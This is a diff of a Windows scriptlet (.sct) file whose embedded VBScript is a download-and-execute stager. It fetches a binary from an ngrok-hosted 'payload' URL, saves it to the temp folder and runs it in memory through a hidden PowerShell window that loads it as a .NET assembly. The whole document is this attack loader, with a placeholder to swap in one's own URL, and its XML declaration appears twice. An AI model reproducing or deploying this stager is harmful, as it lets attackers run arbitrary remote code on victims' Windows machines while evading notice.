@@ -1,24 +1,42 @@
 <?xml version="1.0"?>
+
+<?xml version="1.0"?>
 <scriptlet>
     <registration
         progid="MyScriptlet"
         classid="{AAAA1111-0000-0000-0000-ABCDEF123456}">
         <script language="VBScript">
             <![CDATA[
-                Dim objShell, objHTTP, strURL, objTempFile
+                Dim objShell, objHTTP, objStream, strURL, strTempPath, objFSO, strTempFile
+
+                ' URL to the binary payload
                 strURL = "https://immune-gopher-finer.ngrok-free.app/raw.bin" ' <-- Replace with your URL
-                Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+                ' Create an XMLHTTP object to download the file
+                Set objHTTP = CreateObject("MSXML2.XMLHTTP")
                 objHTTP.Open "GET", strURL, False
                 objHTTP.Send
-                If objHTTP.Status = 200 Then
-                    ' Create a temporary file to store the downloaded binary
-                    Set objTempFile = CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Windows\Temp\p.bin", True)
-                    objTempFile.Write objHTTP.responseBody
-                    objTempFile.Close
 
-                    ' Execute the binary using PowerShell to avoid writing to disk
+                ' Check if the HTTP request was successful (Status 200)
+                If objHTTP.Status = 200 Then
+                    ' Get the temporary directory path
+                    Set objFSO = CreateObject("Scripting.FileSystemObject")
+                    strTempPath = objFSO.GetSpecialFolder(2) ' Temporary folder path
+
+                    ' Define the temporary file path
+                    strTempFile = strTempPath & "\" & objFSO.GetTempName()
+
+                    ' Create a stream to save the binary data
+                    Set objStream = CreateObject("ADODB.Stream")
+                    objStream.Type = 1 ' Binary data
+                    objStream.Open
+                    objStream.Write objHTTP.responseBody
+                    objStream.SaveToFile strTempFile, 2 ' Save the binary data to a file
+                    objStream.Close
+
+                    ' Execute the binary file using PowerShell (in memory)
                     Set objShell = CreateObject("WScript.Shell")
-                    objShell.Run "powershell -nop -w hidden -c ""[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\Windows\Temp\p.bin')).EntryPoint.Invoke($null, $null)"""
+                    objShell.Run "powershell -nop -w hidden -c ""[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('" & strTempFile & "')).EntryPoint.Invoke($null, $null)""", 0, False
                 End If
             ]]>
         </script>
